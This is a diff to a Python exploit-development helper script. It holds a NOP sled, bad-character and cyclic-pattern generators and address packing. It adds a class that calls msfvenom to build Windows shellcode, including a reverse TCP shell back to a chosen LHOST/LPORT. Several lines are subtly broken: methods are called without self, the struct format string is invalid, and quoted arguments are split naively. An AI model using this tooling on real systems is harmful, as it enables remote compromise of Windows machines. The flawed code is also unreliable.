@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
-import socket, time
-import struct, os, struct
+import socket, time, re
+import struct, os, struct,subprocess
 
 
-nop_sled_16 = "\x90"*16        # 16 byte NOP sled if needed
-sub_esp_10= "\x83\xec\x10"  # sub esp,0x10 (drop esp back to 16 bytes)
+nop_sled_16 = "\x90"*16         # 16 byte NOP sled if needed
+sub_esp_10= "\x83\xec\x10"      # sub esp,0x10 (drop esp back to 16 bytes)
 
 # These are useful methods for testing purposes while develop an exploit
 def encode(string):
@@ -20,6 +20,8 @@ def generate_bctest(badchars=['0x00']):
     for i in range(0x00,0xFF+1):       # python range 0 - 255 (+1 is need for 255)
         if i not in badchars:
             bctest += chr(i)            # Add character to string ii it is not a known bad char
+      
+    # Write the output into a file        
     with open('bctest.bin','wb') as f:  
         f.write(encode(bctest))         # write the result into a binary (required for mona)
     return bctest                       # return the resulted string
@@ -53,6 +55,8 @@ def _get_next_pattern_string(i,j,k):
     return alphabet[k].upper()+alphabet[j]+str(i)   # generate pattern element from the given parameters, and return it.
 
 
+def _format_int(integer):
+    return "\\x{:02x}".format(integer)
 def get_pattern_offset(length, EIP):
     """
     This modul will determine the offset of the given EPI stored value.
@@ -112,3 +116,28 @@ def pack_big_endian(address):
     return struct.pack('I>',address)
 def pack(t,address):
     return decode(struct.pack(t,address))
+
+
+
+# Start of Class
+class msf_shellcode:
+
+    def run_msfvenom_command(self,command):
+        if not command.startswith('msfvenom'):
+            command = "msfvenom "+command
+        cmd = command.split(' ')
+        result = subprocess.run(cmd,text=True,capture_output=True)
+        pattern = r'(\\x[0-9a-fA-F]{2})'
+        match = re.findall(pattern,result.stdout,re.I|re.M)
+        shellcode = ""
+        for m in match:
+            shellcode += m
+        return shellcode
+    def generate_popcalc(self,exitfunc="thread",badchars=""):
+        shellcode = run_msfvenom_command(f"-p windows/exec CMD=calc.exe EXITFUNC={exitfunc} -b '{badchars}' -f python")
+        return shellcode
+    def generate_ncrev_shell(self,exitfunc="thread",badchars="",lhost="",lport=""):
+        return run_msfvenom_command(f"-p windows/shell_reverse_tcp EXITFUNC={exitfunc} -b '{badchars}' -f python LHOST={lhost} LPORT={lport}")
+              
+              
+              
